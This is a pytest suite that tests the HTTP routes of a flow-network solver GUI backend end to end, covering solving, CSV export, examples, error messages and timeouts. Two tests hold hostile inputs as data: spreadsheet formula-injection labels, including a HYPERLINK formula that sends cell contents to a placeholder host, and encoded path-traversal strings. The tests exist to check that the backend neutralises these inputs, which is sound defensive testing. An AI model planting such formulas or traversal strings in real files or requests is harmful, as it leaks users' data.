"""Every GUI backend route, end to end through the HTTP layer.

`/export` was broken for three and a half months because `to_dataframe` was
unit-tested and the route that calls it was not. Calling a route coroutine
directly (as `test_gui_export_endpoint.py` does) still skips the request
body parsing, `response_model` serialization and JSON encoding, so this file
sends real requests to the ASGI app (`_asgi_client`, no `httpx` needed) and
reads what the browser would.

`test_every_route_is_covered_here` fails when a route is added without a test
in this file.
"""

from __future__ import annotations

import contextlib
import csv
import io
import json
import re
import threading
import time
import warnings
from pathlib import Path

import pytest
from _asgi_client import request
from _fd_jacobian import fd_jacobian

import gui.backend.main as backend
from gui.backend.main import app

_REPO = Path(__file__).resolve().parents[2]
_CANVAS = _REPO / "gui" / "frontend" / "src" / "components" / "NetworkCanvas.tsx"
_FLOW_TYPES = _REPO / "gui" / "frontend" / "src" / "components" / "flowTypes.ts"
_EXAMPLE = _REPO / "python" / "examples" / "combustor.json"

#: Every route the app serves, each exercised by a test below.
_TESTED_ROUTES = {
    "/",
    "/favicon.svg",
    "/icons.svg",
    "/metadata/species",
    "/metadata/presets",
    "/metadata/materials",
    "/solve",
    "/resolve_preview",
    "/export",
    "/solver/continuation_available",
    "/health",
    "/examples",
    "/examples/{example_id}",
    "/{path:path}",
    "/assets",  # mounted only when the frontend is built
}


def _node(nid: str, ntype: str, data: dict | None = None) -> dict:
    return {"id": nid, "type": ntype, "position": {"x": 0.0, "y": 0.0}, "data": data or {}}


def _edge(eid: str, src: str, tgt: str, sh: str | None = None, th: str | None = None) -> dict:
    e: dict = {"id": eid, "source": src, "target": tgt, "data": {}}
    if sh:
        e["sourceHandle"] = sh
    if th:
        e["targetHandle"] = th
    return e


def _pipe(**solver_settings: object) -> dict:
    """Two pressure boundaries and a channel: the smallest solvable network."""
    return {
        "nodes": [
            _node("inlet", "pressure_boundary", {"Pt": 2.0e5, "Tt": 300.0}),
            _node("ch", "channel", {"L": 0.5, "D": 0.05}),
            _node("outlet", "pressure_boundary", {"Pt": 1.9e5, "Tt": 300.0}),
        ],
        "edges": [_edge("e1", "inlet", "ch"), _edge("e2", "ch", "outlet")],
        "solver_settings": dict(solver_settings),
    }


def _post(path: str, body: dict | None = None, raw: bytes | None = None):
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        return request(app, "POST", path, json_body=body, raw_body=raw)


def _assert_readable_error(r, *must_contain: str) -> str:
    """A 4xx with a `detail` a user can act on: no pydantic boilerplate."""
    assert 400 <= r.status_code < 500, (r.status_code, r.text[:300])
    assert r.headers["content-type"].startswith("application/json"), r.text[:300]
    detail = r.json()["detail"]
    assert isinstance(detail, str) and detail
    assert "errors.pydantic.dev" not in detail, detail
    assert "Traceback" not in detail, detail
    for s in must_contain:
        assert s in detail, f"{s!r} not in {detail!r}"
    return detail


@pytest.fixture(autouse=True)
def _fresh_continuation_state(monkeypatch: pytest.MonkeyPatch) -> None:
    # /solve keeps the last converged state at module level; one test's
    # solve must not decide what another's continuation request sees.
    monkeypatch.setattr(backend, "_continuation_state", None)


# ---------------------------------------------------------------------------
# Route inventory
# ---------------------------------------------------------------------------


def test_every_route_is_covered_here() -> None:
    served = {getattr(r, "path", None) for r in app.routes}
    served -= {"/openapi.json", "/docs", "/docs/oauth2-redirect", "/redoc", None}
    assert served <= _TESTED_ROUTES, f"routes without an end-to-end test: {served - _TESTED_ROUTES}"


# ---------------------------------------------------------------------------
# GET routes
# ---------------------------------------------------------------------------


def test_health() -> None:
    r = request(app, "GET", "/health")
    assert r.status_code == 200 and r.json() == {"status": "ok"}


def test_examples_lists_every_shipped_example() -> None:
    """The Examples menu (#793) reads id, title and label for each file in
    gui/examples/."""
    r = request(app, "GET", "/examples")
    assert r.status_code == 200
    listed = {e["id"]: e for e in r.json()["examples"]}
    shipped = {p.stem for p in (_REPO / "gui" / "examples").glob("*.json")}
    assert set(listed) == shipped and len(shipped) >= 2
    assert all(
        e["title"] and e["label"] in ("fidelity", "cross-source", "tuned") for e in listed.values()
    )


def test_an_example_is_served_as_a_network_file() -> None:
    r = request(app, "GET", "/examples/iso5167_orifice_metering")
    assert r.status_code == 200
    body = r.json()
    assert body["nodes"] and body["edges"] and body["example"]["label"] == "fidelity"


@pytest.mark.parametrize("bad", ["no_such_example", "..%2Fpyproject", "%2E%2E"])
def test_only_listed_examples_are_served(bad: str) -> None:
    """The id is looked up in the listing, never joined onto a path."""
    assert request(app, "GET", f"/examples/{bad}").status_code == 404


def test_root_serves_the_app_or_the_api_banner() -> None:
    r = request(app, "GET", "/")
    assert r.status_code == 200
    if r.headers["content-type"].startswith("application/json"):
        assert r.json()["health"] == "/health"
    else:
        assert "<html" in r.text.lower()


def test_species_metadata_has_what_the_composition_editor_reads() -> None:
    """CompositionEditor reads `names`; the store types `molar_masses` too."""
    r = request(app, "GET", "/metadata/species")
    assert r.status_code == 200
    body = r.json()
    assert body["names"] and all(isinstance(n, str) for n in body["names"])
    assert len(body["molar_masses"]) == len(body["names"])
    assert all(m > 0 for m in body["molar_masses"])
    assert {"N2", "O2", "CH4"} <= set(body["names"])


def test_presets_metadata_matches_the_schema() -> None:
    from typing import get_args

    from gui.backend.schemas import CompositionData

    r = request(app, "GET", "/metadata/presets")
    assert r.status_code == 200
    body = r.json()
    fields = CompositionData.model_fields
    assert set(body["sources"]) == set(get_args(fields["source"].annotation))
    assert set(body["modes"]) == set(get_args(fields["mode"].annotation))


def test_materials_metadata_is_a_non_empty_name_list() -> None:
    r = request(app, "GET", "/metadata/materials")
    assert r.status_code == 200
    names = r.json()["names"]
    assert names and all(isinstance(n, str) and n for n in names)


@pytest.mark.parametrize("path", ["/favicon.svg", "/icons.svg"])
def test_icons_are_served_or_missing_never_a_500(path: str) -> None:
    """Without a built frontend (a repo checkout, the Vite dev server) these
    were a bare 'Internal Server Error' from a FileResponse on a missing file."""
    r = request(app, "GET", path)
    assert r.status_code in (200, 404), (r.status_code, r.text[:200])
    if r.status_code == 200:
        assert "svg" in r.headers["content-type"]


def test_an_unknown_path_is_the_spa_or_a_json_404() -> None:
    r = request(app, "GET", "/no/such/page")
    if backend._FRONTEND_DIST.is_dir():
        assert r.status_code == 200 and "<html" in r.text.lower()
    else:
        assert r.status_code == 404
        assert r.json()["detail"] == "/no/such/page not found"


def test_assets_mount_serves_files_when_the_frontend_is_built() -> None:
    assets = backend._FRONTEND_DIST / "assets"
    if not assets.is_dir():
        pytest.skip("frontend not built: /assets is not mounted")
    first = next(p for p in assets.iterdir() if p.is_file())
    r = request(app, "GET", f"/assets/{first.name}")
    assert r.status_code == 200 and r.body


# ---------------------------------------------------------------------------
# /solve, /export, /resolve_preview on a real network
# ---------------------------------------------------------------------------


def test_solve_returns_converged_states_for_every_node() -> None:
    r = _post("/solve", _pipe())
    assert r.status_code == 200, r.text[:300]
    body = r.json()
    assert body["success"] is True, body["message"]
    assert {"inlet", "outlet"} <= set(body["node_results"])
    assert body["element_results"]["ch"]["m_dot"] > 0.0
    p_in = body["node_results"]["inlet"]["state"]["Pt"]
    p_out = body["node_results"]["outlet"]["state"]["Pt"]
    assert p_in == pytest.approx(2.0e5) and p_out == pytest.approx(1.9e5)
    assert body["final_norm"] is not None and body["final_norm"] < 1e-6


def test_export_returns_a_csv_with_one_row_per_entity() -> None:
    r = _post("/export", _pipe())
    assert r.status_code == 200, r.text[:300]
    assert r.headers["content-type"].startswith("text/csv")
    assert "attachment" in r.headers["content-disposition"]
    rows = list(csv.DictReader(io.StringIO(r.text)))
    ids = [row["id"] for row in rows]
    assert {"inlet", "ch", "outlet"} <= set(ids)
    assert len(ids) == len(set(ids)), f"duplicated rows: {ids}"
    assert any(k.startswith("P [") for k in rows[0])


def test_export_rows_carry_the_solve_status() -> None:
    r = _post("/export", _pipe())
    assert r.headers["x-combaero-success"] == "true"
    rows = list(csv.DictReader(io.StringIO(r.text)))
    assert {row["success"] for row in rows} == {"True"}
    assert {row["outcome"] for row in rows} == {r.headers["x-combaero-outcome"]}
    assert list(rows[0])[:11] == [
        "type", "kind", "is_boundary", "combustion_method", "id", "label",
        "success", "converged", "consistent", "outcome", "final_norm",
    ]  # fmt: skip


def test_a_pressure_boundary_exports_its_reservoir_state_not_a_default() -> None:
    """A pressure boundary emits only Pt/Tt; its static P used to be a
    made-up 101325 Pa beside Pt = 2 bar and a rho evaluated at 2 bar."""
    rows = {row["id"]: row for row in csv.DictReader(io.StringIO(_post("/export", _pipe()).text))}
    assert float(rows["inlet"]["P [Pa]"]) == float(rows["inlet"]["Pt [Pa]"]) == 2.0e5
    assert float(rows["outlet"]["P [Pa]"]) == 1.9e5


@pytest.mark.parametrize(
    "label",
    ['=HYPERLINK("http://example.invalid/?"&A1,"x")', "+1+1", "-2+3", "@SUM(1)", "\tcmd"],
)
def test_a_label_a_spreadsheet_would_run_is_exported_as_text(label: str) -> None:
    """CSV injection: a shared network's label must not run as a formula
    when the export is opened in a spreadsheet."""
    body = _pipe()
    body["nodes"][1]["data"]["label"] = label
    rows = {row["id"]: row for row in csv.DictReader(io.StringIO(_post("/export", body).text))}
    assert rows["ch"]["label"] == "'" + label
    assert rows["inlet"]["label"] == ""


def test_resolve_preview_returns_the_resolved_geometry() -> None:
    body = _pipe()
    body["nodes"][1]["data"] = {"L": 0.5, "D": None}  # inherits: nothing upstream
    r = _post("/resolve_preview", body)
    assert r.status_code == 200, r.text[:300]
    items = r.json()["items"]
    assert set(items) == {"inlet", "ch", "outlet"}
    d = items["ch"]["fields"]["diameter"]
    assert d["value"] > 0.0 and d["source"]


def test_the_saved_example_network_runs_through_every_route() -> None:
    """The one saved GUI file in the repository, results included as the
    GUI writes them (they warm-start the next solve)."""
    graph = json.loads(_EXAMPLE.read_text(encoding="utf-8"))
    assert _post("/resolve_preview", graph).status_code == 200
    solved = _post("/solve", graph)
    assert solved.status_code == 200 and solved.json()["success"], solved.text[:300]
    exported = _post("/export", graph)
    assert exported.status_code == 200
    ids = {row["id"] for row in csv.DictReader(io.StringIO(exported.text))}
    drawn = {n["id"] for n in graph["nodes"] if n["type"] != "probe"}
    assert drawn <= ids


def test_continuation_round_trip() -> None:
    assert request(app, "GET", "/solver/continuation_available").json() == {"available": False}
    assert _post("/solve", _pipe()).json()["success"]
    assert request(app, "GET", "/solver/continuation_available").json() == {"available": True}

    again = _post("/solve", _pipe(init_strategy="continuation"))
    assert again.status_code == 200 and again.json()["success"]

    changed = _pipe(init_strategy="continuation")
    changed["nodes"].append(_node("pl", "plenum"))
    changed["nodes"].append(_node("ch2", "channel", {"L": 0.5, "D": 0.05}))
    changed["edges"][1] = _edge("e2", "ch", "pl")
    changed["edges"].append(_edge("e3", "pl", "ch2"))
    changed["edges"].append(_edge("e4", "ch2", "outlet"))
    _assert_readable_error(_post("/solve", changed), "Topology mismatch")


# ---------------------------------------------------------------------------
# Every kind the palette can drop, with the defaults it drops it with
# ---------------------------------------------------------------------------


def _palette_kinds() -> list[str]:
    text = _FLOW_TYPES.read_text(encoding="utf-8")
    block = text.split("export const nodeTypes = {", 1)[1].split("};", 1)[0]
    return re.findall(r"^\s*(\w+):", block, re.M)


def _drop_defaults(kind: str) -> dict:
    """The `data` NetworkCanvas.onDrop gives a freshly dropped node (flat
    literals only; nested objects are left to the schema's defaults)."""
    text = _CANVAS.read_text(encoding="utf-8")
    m = re.search(r'type === "' + kind + r'"\)\s*\{\s*data = \{(.*?)\}\s*as any', text, re.S)
    out: dict = {}
    if not m:
        return out
    for key, raw in re.findall(r"^\s*(\w+):\s*([^,{}\n]+),", m.group(1), re.M):
        with contextlib.suppress(json.JSONDecodeError):
            out[key] = json.loads(raw.strip())
    return out


def _palette_network(kind: str) -> dict:
    data = _drop_defaults(kind)
    pb = "pressure_boundary"
    hi, lo = {"Pt": 1.05e5, "Tt": 300.0}, {"Pt": 1.0e5, "Tt": 300.0}
    if kind in ("mpce_tee",):
        nodes = [
            _node("in", pb, hi),
            _node("o1", pb, lo),
            _node("o2", pb, lo),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("c2", "channel", {"L": 0.5, "D": 0.05}),
            _node("c3", "channel", {"L": 0.5, "D": 0.05}),
            _node("x", kind, data),
        ]
        edges = [
            _edge("e1", "in", "c1"),
            _edge("e2", "c1", "x", th="port-common-target"),
            _edge("e3", "x", "c2", sh="port-straight-source"),
            _edge("e4", "c2", "o1"),
            _edge("e5", "x", "c3", sh="port-branch-source"),
            _edge("e6", "c3", "o2"),
        ]
    elif kind == "ejector":
        nodes = [
            _node("pp", pb, {"Pt": 7e5, "Tt": 440.0}),
            _node("ps", pb, {"Pt": 22850.0, "Tt": 280.0}),
            _node("po", pb, {"Pt": 30000.0, "Tt": 300.0}),
            _node("mp", "momentum_chamber", {"area": 0.05}),
            _node("ms", "momentum_chamber", {"area": 0.05}),
            _node("mo", "momentum_chamber", {"area": 0.05}),
            _node("x", kind, data),
        ]
        edges = [
            _edge("e1", "pp", "mp"),
            _edge("e2", "mp", "x", th="port-primary-target"),
            _edge("e3", "ps", "ms"),
            _edge("e4", "ms", "x", th="port-secondary-target"),
            _edge("e5", "x", "mo", sh="port-outlet-source"),
            _edge("e6", "mo", "po"),
        ]
    elif kind == "effusion_liner":
        nodes = [
            _node("cin", pb, {"Pt": 1.04e5, "Tt": 600.0}),
            _node("cout", pb, {"Pt": 1.038e5, "Tt": 600.0}),
            _node("gin", pb, {"Pt": 1.003e5, "Tt": 1500.0}),
            _node("gout", pb, {"Pt": 1.0e5, "Tt": 1500.0}),
            _node("d1", "channel", {"L": 0.2, "D": 0.08}),
            _node("d2", "channel", {"L": 0.2, "D": 0.08}),
            _node("mc", "momentum_chamber"),
            _node("x", kind, data),
        ]
        edges = [
            _edge("g1", "gin", "d1"),
            _edge("g2", "d1", "mc", th="flow-target"),
            _edge("g3", "mc", "d2"),
            _edge("g4", "d2", "gout"),
            _edge("l1", "cin", "x", th="port-coolantin-target"),
            _edge("l2", "x", "cout", sh="port-coolantout-source"),
            _edge("l3", "x", "mc", sh="port-discharge-source", th="side-target"),
        ]
    elif kind in (
        "plenum",
        "momentum_chamber",
        "combustor",
        "wall",
        "probe",
        "heat_source",
        # These two need a neighbour with an area / a lossy element beside them.
        "area_change",
        "lossless_connection",
    ):
        # An area change refuses equal bores: give it an expansion.
        d2 = 0.08 if kind == "area_change" else 0.05
        nodes = [
            _node("in", pb, hi),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("c2", "channel", {"L": 0.5, "D": d2}),
            _node("out", pb, lo),
        ]
        edges = [_edge("e1", "in", "c1"), _edge("e3", "c2", "out")]
        if kind == "wall":
            # A closed end off a plenum: m_dot = 0 down the stub.
            nodes += [_node("pl", "plenum"), _node("c3", "channel", {"L": 0.2, "D": 0.02})]
            nodes.append(_node("x", kind, data))
            edges += [_edge("e2", "c1", "pl"), _edge("e4", "pl", "c2")]
            edges += [_edge("e5", "pl", "c3"), _edge("e6", "c3", "x")]
        elif kind == "probe":
            nodes.append(_node("x", kind, {**data, "target_id": "c1"}))
            edges.append(_edge("e2", "c1", "c2"))
        elif kind == "heat_source":
            # Heats a plenum between the channels by its one edge (#792).
            nodes += [_node("pl", "plenum"), _node("x", kind, data)]
            edges += [_edge("e2", "c1", "pl"), _edge("e4", "pl", "c2")]
            edges.append(_edge("e5", "x", "pl", sh="heat-out", th="flow-top"))
        else:
            nodes.append(_node("x", kind, data))
            edges += [_edge("e2", "c1", "x"), _edge("e4", "x", "c2")]
    elif kind in ("compressor", "turbine"):
        # A fixed pressure ratio (#893) between two channels: the channels set
        # the flow (between two boundaries alone nothing would).
        # A few percent of the drive in the channels: moderate Mach.
        pin, pout = (1.0e5, 3.8e5) if kind == "compressor" else (3.99e5, 1.0e5)
        nodes = [
            _node("in", pb, {"Pt": pin, "Tt": 300.0 if kind == "compressor" else 900.0}),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("x", kind, data),
            _node("c2", "channel", {"L": 0.5, "D": 0.05}),
            _node("out", pb, {"Pt": pout, "Tt": 300.0}),
        ]
        edges = [
            _edge("e1", "in", "c1"),
            _edge("e2", "c1", "x"),
            _edge("e3", "x", "c2"),
            _edge("e4", "c2", "out"),
        ]
    elif kind == "flow_splitter":
        # Half each way (#903); the remainder, outlet 2, is the reference and
        # takes the narrower channel, the path needing the most pressure.
        nodes = [
            _node("in", pb, hi),
            _node("x", kind, data),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("c2", "channel", {"L": 0.5, "D": 0.02}),
            _node("o1", pb, lo),
            _node("o2", pb, lo),
        ]
        edges = [
            _edge("e1", "in", "x", th="port-in-target"),
            _edge("e2", "x", "c1", sh="port-out0-source"),
            _edge("e3", "c1", "o1"),
            _edge("e4", "x", "c2", sh="port-out1-source"),
            _edge("e5", "c2", "o2"),
        ]
    elif kind == "fuel_boundary":
        # The fuel controller (#892) sets a combustor between two channels.
        nodes = [
            _node("in", pb, hi),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("cb", "combustor"),
            _node("c2", "channel", {"L": 0.5, "D": 0.05}),
            _node("out", pb, lo),
            _node("x", kind, {**data, "combustor_id": "cb"}),
        ]
        edges = [
            _edge("e1", "in", "c1"),
            _edge("e2", "c1", "cb"),
            _edge("e3", "x", "cb"),
            _edge("e4", "cb", "c2"),
            _edge("e5", "c2", "out"),
        ]
    elif kind in ("pressure_boundary", "mass_boundary"):
        inlet = data | ({"m_dot": 0.05} if kind == "mass_boundary" else {"Pt": 1.05e5})
        nodes = [
            _node("x", kind, inlet),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("out", pb, lo),
        ]
        edges = [_edge("e1", "x", "c1"), _edge("e2", "c1", "out")]
    elif kind in ("discrete_loss", "vortex"):
        # Their Pt relation is fixed at any flow (a fraction loss without
        # m_ref, a free vortex): alone between two boundaries nothing sets
        # the flow, and validate() refuses it (#1003). A channel sets it.
        nodes = [
            _node("in", pb, hi),
            _node("x", kind, data),
            _node("c1", "channel", {"L": 0.5, "D": 0.05}),
            _node("out", pb, lo),
        ]
        edges = [_edge("e1", "in", "x"), _edge("e2", "x", "c1"), _edge("e3", "c1", "out")]
    else:  # a two-port element between two boundaries
        nodes = [_node("in", pb, hi), _node("x", kind, data), _node("out", pb, lo)]
        edges = [_edge("e1", "in", "x"), _edge("e2", "x", "out")]
    return {"nodes": nodes, "edges": edges, "solver_settings": {"timeout": 20.0}}


def test_the_palette_list_is_what_this_file_knows() -> None:
    """A new palette kind needs a network in `_palette_network`."""
    assert len(_palette_kinds()) == 25, _palette_kinds()


@pytest.mark.parametrize("kind", _palette_kinds())
def test_every_palette_kind_solves_through_http(kind: str) -> None:
    """Accepted by the schema, built by the builder, serialized by the
    response model: 200 with a result for the dropped node. Convergence is
    not the point; a 4xx/5xx here means a node the palette offers cannot be
    solved at all."""
    graph = _palette_network(kind)
    r = _post("/solve", graph)
    assert r.status_code == 200, r.text[:400]
    body = r.json()
    assert isinstance(body["success"], bool) and isinstance(body["message"], str)
    if kind != "probe":
        assert "x" in body["node_results"] or "x" in body["element_results"], sorted(
            [*body["node_results"], *body["element_results"]]
        )
    assert _post("/resolve_preview", graph).status_code == 200


def test_the_palette_effusion_liner_panels_have_their_exact_jacobian() -> None:
    """#760: the palette's effusion_liner panels run below McGreehan-Schotsch's
    Re floor (Cd held), where each panel row's Jacobian was uniformly 0.9874x
    central differences (1.26e-2 in J_ij |x_j|, the same at every step): the
    self-consistent row divided by 1 - K dCd/dm with the C++ floor
    continuation slope instead of the held value's 0.

    Panel rows only: measured 4.6e-9 at a 1e-6 step (1.1e-8 at 1e-5). The
    chamber's rows carry FD truncation at that step (2.9e-3, falling 100x per
    decade of step), which is not what this checks."""
    import numpy as np

    from combaero.network import NetworkSolver
    from gui.backend.graph_builder import build_network_from_schema
    from gui.backend.schemas import NetworkGraphSchema

    net = build_network_from_schema(NetworkGraphSchema(**_palette_network("effusion_liner")))
    s = NetworkSolver(net)
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        r = s.solve()
    assert r["__success__"]
    d = r["__element_diag__"]
    panels = [k for k in d if "Re_hole" in d[k] and "Cd_inlet_crossflow_U1_over_Vi" in d[k]]
    assert len(panels) == 4 and all(d[k]["Re_hole"] < 1e4 for k in panels)
    x = np.array(r["__x_solution__"])
    _, J = s._residuals_and_jacobian(x)
    fd = fd_jacobian(s, x)
    cols = np.maximum(np.abs(x), 1e-12)[None, :]
    rows = [i for i, (o, _) in enumerate(s._row_kinds(x)) if o.startswith("EffusionPlateElement")]
    assert len(rows) == 4
    Js, fds = (J.toarray() * cols)[rows], (fd * cols)[rows]
    scale = np.max(np.abs(fds), axis=1, keepdims=True)
    assert float(np.max(np.abs(Js - fds) / scale)) < 1e-6


# ---------------------------------------------------------------------------
# Error paths: a readable 4xx, never a raw 500 or a silent drop
# ---------------------------------------------------------------------------


def test_malformed_json_is_a_422() -> None:
    r = _post("/solve", raw=b"{not json")
    assert r.status_code == 422 and r.json()["detail"]


def test_a_missing_top_level_field_is_a_422() -> None:
    r = _post("/solve", {"nodes": []})
    assert r.status_code == 422
    assert any(e["loc"] == ["body", "edges"] for e in r.json()["detail"])


def test_an_empty_network_is_a_readable_400() -> None:
    _assert_readable_error(_post("/solve", {"nodes": [], "edges": []}), "no nodes")


@pytest.mark.parametrize("route", ["/solve", "/resolve_preview", "/export"])
def test_an_unknown_node_kind_is_refused_not_dropped(route: str) -> None:
    """A parallel branch of an unknown kind used to be skipped: the network
    solved WITHOUT it and reported success (a wrong answer presented as a
    right one), e.g. a file from another version naming a kind this one does
    not have."""
    graph = _pipe()
    graph["nodes"] += [_node("pl", "plenum"), _node("bogus", "dimpled_channel", {"L": 0.5})]
    graph["nodes"].append(_node("ch2", "channel", {"L": 0.5, "D": 0.05}))
    graph["edges"] = [
        _edge("e1", "inlet", "ch"),
        _edge("e2", "ch", "pl"),
        _edge("e3", "pl", "ch2"),
        _edge("e4", "ch2", "outlet"),
        _edge("e5", "pl", "bogus"),
        _edge("e6", "bogus", "outlet"),
    ]
    _assert_readable_error(_post(route, graph), "bogus", "dimpled_channel")


@pytest.mark.parametrize("route", ["/solve", "/resolve_preview"])
def test_an_edge_to_a_node_not_on_the_canvas_is_refused(route: str) -> None:
    graph = _pipe()
    graph["edges"].append(_edge("e9", "inlet", "ghost"))
    _assert_readable_error(_post(route, graph), "e9", "ghost")


def test_a_probe_link_edge_does_not_break_the_element() -> None:
    """A probe is display-only and has a `probe-in` handle a flow edge can be
    drawn to. The builder counted that edge as the channel's second outlet:
    'has multiple downstream links'."""
    graph = _pipe()
    graph["nodes"].append(_node("pr", "probe", {"target_id": "ch"}))
    graph["edges"].append(_edge("e3", "ch", "pr", th="probe-in"))
    r = _post("/solve", graph)
    assert r.status_code == 200, r.text[:300]
    assert r.json()["success"]


@pytest.mark.parametrize("route", ["/solve", "/resolve_preview", "/export"])
def test_a_removed_surface_says_why_and_where(route: str) -> None:
    """Dimpled was removed in 0.7.0. `map_surface_model` has the message,
    but the schema's surface union refused first, so a saved file got five
    pydantic literal errors instead -- the unit test passes a stand-in
    object and never sees the union."""
    graph = _pipe()
    graph["nodes"][1]["data"]["surface"] = {"type": "dimpled", "depth": 0.2}
    _assert_readable_error(_post(route, graph), "removed in 0.7.0", "#339", "'ch'")


def test_an_unknown_surface_is_named() -> None:
    graph = _pipe()
    graph["nodes"][1]["data"]["surface"] = {"type": "wavy"}
    _assert_readable_error(_post("/solve", graph), "'wavy'", "'ch'")


def test_a_bad_field_value_names_the_node_and_the_field() -> None:
    """Pydantic's message names the model ('ChannelData'), not the node, so
    with several channels the user could not tell which one."""
    graph = _pipe()
    graph["nodes"][1]["data"]["L"] = "abc"
    _assert_readable_error(_post("/solve", graph), "'ch'", "L")


def test_a_bad_thermal_wall_value_names_the_edge() -> None:
    graph = _pipe()
    graph["nodes"].append(_node("ch2", "channel", {"L": 0.5, "D": 0.05}))
    graph["nodes"].append(_node("in2", "pressure_boundary", {"Pt": 2e5, "Tt": 400.0}))
    graph["edges"] += [_edge("e3", "in2", "ch2"), _edge("e4", "ch2", "outlet")]
    wall = _edge("w1", "ch", "ch2")
    wall["data"] = {"type": "thermal", "orientation": "sideways"}
    graph["edges"].append(wall)
    _assert_readable_error(_post("/solve", graph), "'w1'", "orientation")


@pytest.mark.parametrize(("L", "D"), [(-1.0, 0.05)])
def test_non_positive_geometry_is_a_failed_solve_that_names_the_element(
    L: float, D: float, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A network that cannot be solved: 200, success false, and a message
    naming the element. Run as the GUI runs it, not strict (conftest makes
    the suite strict, which raises the element's bare message instead)."""
    from combaero.network.solver import SOLVER_STRICT_ENV

    monkeypatch.setenv(SOLVER_STRICT_ENV, "0")
    graph = _pipe()
    graph["nodes"][1]["data"].update({"L": L, "D": D})
    r = _post("/solve", graph)
    assert r.status_code == 200, r.text[:300]
    body = r.json()
    assert body["success"] is False
    assert "'ch' [Channel]" in body["message"] and "positive" in body["message"], body["message"]


@pytest.mark.parametrize("D", [0.0, -0.05])
def test_a_duct_without_area_is_refused_before_the_solve_naming_it(D: float) -> None:
    """A channel of zero or negative diameter is no geometry: refused at
    validate() (#1024), a 400 naming the element, where it used to fail
    mid-solve in the Fanno kernel."""
    graph = _pipe()
    graph["nodes"][1]["data"].update({"L": 0.5, "D": D})
    r = _post("/solve", graph)
    assert r.status_code == 400, r.text[:300]
    detail = r.json()["detail"]
    assert "'ch' [Channel]" in detail and "positive" in detail, detail


def test_nan_geometry_in_a_preview_is_not_a_bare_500() -> None:
    """JSON NaN (Python clients accept and send it) reached the preview's
    resolved values, and the JSON encoder raised after the route returned:
    a plain-text 'Internal Server Error'."""
    raw = json.dumps(_pipe()).replace('"D": 0.05', '"D": NaN').encode()
    r = _post("/resolve_preview", raw=raw)
    assert r.status_code < 500, r.text[:200]
    assert r.headers["content-type"].startswith("application/json")


# ---------------------------------------------------------------------------
# Timeouts bound the wall time
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("route", ["/solve", "/export"])
def test_the_soft_timeout_ends_the_solve(route: str) -> None:
    r = _post(route, _pipe(timeout=0.001))
    assert r.status_code == 200
    assert r.elapsed < 5.0
    if route == "/solve":
        assert r.json()["success"] is False and "timed out" in r.json()["message"]
    else:
        # The CSV still comes back, but it says the solve failed: in a header
        # for the GUI and on every row for whoever opens the file.
        assert r.headers["x-combaero-success"] == "false"
        rows = list(csv.DictReader(io.StringIO(r.text)))
        assert rows and {row["success"] for row in rows} == {"False"}


@pytest.mark.parametrize("route", ["/solve", "/export"])
def test_the_hard_timeout_answers_while_the_worker_is_still_stuck(
    route: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A worker that ignores the soft timeout (one long C++ call) must not
    hold the request: the route answers 504 at soft + margin."""

    def stuck(schema: object, token: int | None = None) -> None:
        time.sleep(1.5)
        raise AssertionError("the route should not have waited for this")

    monkeypatch.setattr(backend, "_solve_sync", stuck)
    monkeypatch.setattr(backend, "HARD_TIMEOUT_MARGIN", 0.2)
    r = _post(route, _pipe(timeout=0.1))
    assert r.status_code == 504
    assert r.elapsed < 1.0, r.elapsed
    detail = r.json()["detail"]
    # The limit it names is one the user can raise, or clear (#762).
    assert "0.3 s" in detail and "Max Solver Time" in detail, detail
    assert "clear it for no limit" in detail, detail


def _slow_then_real(delay: float, done: threading.Event):
    """A `_solve_sync` stand-in that sits `delay` s in one uninterruptible
    call, as a long C++ step would, then runs the real solve."""
    real = backend._solve_sync

    def slow(schema: object, token: int | None = None):
        try:
            time.sleep(delay)
            return real(schema, token)
        finally:
            done.set()

    return slow


@pytest.fixture
def _export_solves(monkeypatch: pytest.MonkeyPatch) -> None:
    """For the tests of /export's own solve (timeouts, continuation): no
    cached displayed result (#783) may stand in for it."""
    backend._SOLVE_CACHE.clear()
    monkeypatch.setattr(backend, "_remember_solve", lambda schema, solved: None)


@pytest.mark.parametrize("route", ["/solve", "/export"])
def test_no_timeout_means_no_hard_timeout_either(
    _export_solves: None, route: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`timeout: null` is no limit (#762). The route used to substitute
    180 s and cut the request at 190 s. With the margin shrunk to 0.05 s a
    0.5 s worker outlasts any ceiling the route could still be adding."""
    done = threading.Event()
    monkeypatch.setattr(backend, "_solve_sync", _slow_then_real(0.5, done))
    monkeypatch.setattr(backend, "HARD_TIMEOUT_MARGIN", 0.05)
    r = _post(route, _pipe(timeout=None))
    assert r.status_code == 200, r.text[:300]
    assert r.elapsed >= 0.5
    if route == "/solve":
        assert r.json()["success"] is True, r.json()["message"]
    else:
        assert r.headers["x-combaero-success"] == "true"


def test_hard_timeout_follows_the_solver_timeout() -> None:
    """The request deadline is whatever the solver gets plus the margin:
    0 is 0 (it used to become 180 s while the solver got 0), None is none."""
    m = backend.HARD_TIMEOUT_MARGIN
    assert backend._hard_timeout(None) is None
    assert backend._hard_timeout(0.0) == m
    assert backend._hard_timeout(-1.0) == m
    assert backend._hard_timeout(5.0) == 5.0 + m


@pytest.mark.parametrize("route", ["/solve", "/export"])
def test_zero_timeout_times_out_at_once(
    _export_solves: None, route: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`timeout: 0` reaches the solver as 0 (out of time at its first
    residual) and bounds the request at the margin, not at 180 + margin."""
    r = _post(route, _pipe(timeout=0))
    assert r.status_code == 200
    assert r.elapsed < 5.0
    if route == "/solve":
        assert r.json()["success"] is False and "timed out" in r.json()["message"]
    else:
        assert r.headers["x-combaero-success"] == "false"

    done = threading.Event()
    monkeypatch.setattr(backend, "_solve_sync", _slow_then_real(0.5, done))
    monkeypatch.setattr(backend, "HARD_TIMEOUT_MARGIN", 0.05)
    r = _post(route, _pipe(timeout=0))
    assert r.status_code == 504
    assert r.elapsed < 0.5, r.elapsed
